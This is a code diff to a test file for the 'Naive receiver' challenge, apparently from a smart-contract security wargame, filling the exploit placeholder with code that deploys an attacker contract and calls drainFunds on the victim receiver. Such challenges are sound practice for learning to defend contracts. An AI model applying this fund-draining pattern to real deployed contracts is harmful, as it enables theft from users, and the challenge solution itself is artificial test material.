@@ -30,7 +30,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        const AttackerContractFactory = await ethers.getContractFactory('NaiveReceiverAttacker', attacker);
+        const attackerContract = await AttackerContractFactory.deploy(this.pool.address);
+
+        attackerContract.drainFunds(this.receiver.address);
     });
 
     after(async function () {
